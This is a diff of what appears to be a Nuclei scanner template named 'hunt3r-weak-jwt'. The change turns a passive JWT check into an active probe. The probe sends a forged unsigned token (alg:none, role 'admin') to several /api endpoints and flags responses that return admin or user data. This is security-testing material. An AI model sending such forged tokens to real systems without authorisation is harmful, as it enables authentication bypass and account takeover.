@@ -1,15 +1,35 @@
-http:
-- matchers:
-  - part: header
-    regex:
-    - Authorization:\s*Bearer\s*ey[a-zA-Z0-9_-]+
-    type: regex
-  method: GET
-  path:
-  - '{{BaseURL}}/api/'
 id: hunt3r-weak-jwt
+
 info:
+  name: JWT Algorithm Confusion / None Algorithm
   author: hunt3r
-  description: Detect JWTs using weak algorithms or no signature verification
-  name: Weak JWT Configuration
   severity: high
+  description: Probe for JWT none-algorithm acceptance and alg:HS256 confusion.
+  tags: jwt,auth-bypass,hunt3r
+  reference:
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/v2/me"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: regex
+        condition: or
+        regex:
+          - '"role":\s*"admin"'
+          - '"user":\s*\{'
+          - '"id":\s*\d+'
+          - '"email":'
